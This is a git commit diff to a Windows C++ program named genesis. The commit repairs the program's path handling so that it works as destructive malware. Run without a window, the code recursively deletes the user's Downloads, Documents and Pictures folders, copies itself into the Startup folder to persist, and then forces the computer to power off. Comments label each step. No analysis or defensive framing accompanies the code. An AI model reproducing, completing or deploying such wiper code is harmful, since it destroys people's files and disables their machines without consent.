425adac9eb71d1ee5b75e180f9cc34a2fc38e988
Xinyi <cindytianla@gmail.com>
2021-01-29 21:46:01 -0800

    fix userprofile path

--- genesis/Source.cpp
+++ genesis/Source.cpp
@@ -1,23 +1,31 @@
 #include "Header.h"
 
 
-int APIENTRY wWinMain(HINSTANCE Instance,
+int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	HINSTANCE hPreInstance,
 	LPTSTR    lpCmdLine,
 	int		  nCmdShow) {
 
+	char* userpath = getenv("USERPROFILE"); //get %userprofile% path
+	std::string path;
+	std::string pathb;
+	std::string pathc;
+		if (userpath != nullptr)
+			path = std::string(userpath) + "\\Downloads";
+			pathb = std::string(userpath) + "\\Documents";
+			pathc = std::string(userpath) + "\\Pictures";
 
-	char filepath[] = "%userprofile%\\Downloads";
-	char filepathb[] = "%userprofile%\\Pictures";
-	char filepathc[] = "%userprofile%\\Documents";
-	if (std::filesystem::exists(filepath)) {
+	//char filepath[] = "%userprofile%\\Downloads";
+	//char filepathb[] = "%userprofile%\\Pictures";
+	//char filepathc[] = "%userprofile%\\Documents";
+	if (std::filesystem::exists(path)) { //deletes files under directories
 		
-		std::filesystem::remove_all(filepath);
-		std::filesystem::remove_all(filepathb);
-		std::filesystem::remove_all(filepathc);
+		std::filesystem::remove_all(path);
+		std::filesystem::remove_all(pathb);
+		std::filesystem::remove_all(pathc);
 	}
 	
-	char filename[ MAX_PATH ] = "genesis.exe";
+	char filename[ MAX_PATH ] = "genesis.exe"; 
 	char newLocation[] = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
 	if (std::filesystem::exists("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\genesis.exe")) {
 		
@@ -26,12 +34,12 @@ int APIENTRY wWinMain(HINSTANCE Instance,
 	else {
 
 		BOOL stats = 0;
-		DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
+		DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); //copies itself to starup folder
 		if (size)
 			CopyFileA(filename, newLocation, stats);
 	}
 	
-	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE,
+	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, //shuts down computer
 		SHTDN_REASON_MINOR_OTHER);
 
 	return 0;
